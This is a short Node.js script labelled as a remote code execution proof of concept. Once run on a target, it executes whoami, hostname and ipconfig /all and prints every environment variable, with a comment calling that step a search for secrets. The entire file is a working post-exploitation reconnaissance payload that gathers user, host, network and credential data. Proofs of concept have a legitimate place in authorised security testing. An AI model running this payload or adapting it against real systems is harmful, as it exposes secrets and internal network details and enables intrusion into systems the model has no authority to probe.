const { execSync } = require('child_process');

try {
    console.log("--- POF RCE START ---");
    
    // Print Current User
    console.log("Current User: " + execSync('whoami').toString().trim());
    
    // Print Hostname
    console.log("Hostname: " + execSync('hostname').toString().trim());
    
    // Windows specific Internal Network Recon
    console.log("IP Configuration:");
    console.log(execSync('ipconfig /all').toString());
    
    // Environment Variables (Look for Secrets)
    console.log("Environment Variables:");
    console.log(JSON.stringify(process.env, null, 2));
    
    console.log("--- POF RCE END ---");
} catch (e) {
    console.error("POC Execution Failed:", e.message);
}
